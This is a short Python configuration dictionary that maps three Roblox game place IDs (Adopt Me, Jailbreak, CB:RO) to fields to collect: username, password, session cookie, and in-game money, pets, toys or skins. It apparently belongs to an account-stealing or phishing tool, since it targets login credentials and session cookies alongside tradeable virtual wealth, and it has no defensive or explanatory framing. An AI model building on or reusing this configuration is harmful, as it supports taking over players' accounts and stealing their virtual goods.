places = {
    920587237: { ## Adopt Me
        "fields": [
            "username", "password", "money", "pets", "toys", "cookie"
        ]
    },
    606849621: { ## Jailbreak
        "fields": [
            "username", "password", "money", "cookie"
        ]
    },
    301549746: { ## CB:RO
        "fields": [
            "username", "password", "value", "funds", "skins", "cookie"
        ]
    }
}